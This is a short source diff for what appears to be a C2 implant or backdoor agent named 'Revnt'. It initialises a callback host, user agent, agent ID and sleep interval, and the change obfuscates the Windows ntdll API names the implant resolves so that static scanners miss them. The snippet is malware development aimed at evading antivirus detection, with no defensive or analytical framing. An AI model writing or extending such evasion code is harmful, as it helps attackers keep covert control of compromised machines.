@@ -4,9 +4,15 @@
 #include <Config.h>
 #include <Package.h>
 #include <Command.h>
+#include <RevntStrings.h>
+#include <ObfuscateStrings.h>
 
 VOID RevntInit()
 {
+    // DeObf Arrays
+    BYTE local_sRtlRandomEx[12];
+    BYTE local_sRtlGetVersion[14];
+
     // Init Connection info
     Instance.Config.Transport.UserAgent = CONFIG_USER_AGENT;
     Instance.Config.Transport.Host      = CONFIG_HOST;
@@ -14,9 +20,10 @@ VOID RevntInit()
     Instance.Config.Transport.Secure    = CONFIG_SECURE;
 
     // Init Win32
-    Instance.Win32.RtlRandomEx   = (ULONG (*)(PULONG)) GetProcAddress(GetModuleHandleA("ntdll"), "RtlRandomEx");
-    Instance.Win32.RtlGetVersion = (void (*)(POSVERSIONINFOEXW)) GetProcAddress(GetModuleHandleA("ntdll"),
-                                                                                "RtlGetVersion");
+
+    Instance.Win32.RtlRandomEx   = (ULONG (*)(PULONG)) GetProcAddress(GetModuleHandleA(sNtdll), sRtlRandomEx(local_sRtlRandomEx));
+    Instance.Win32.RtlGetVersion = (void (*)(POSVERSIONINFOEXW)) GetProcAddress(GetModuleHandleA(sNtdll),
+                                                                                sRtlGetVersion(local_sRtlGetVersion));
 
     Instance.Session.AgentID = RandomNumber32();
     Instance.Config.Sleeping = CONFIG_SLEEP;
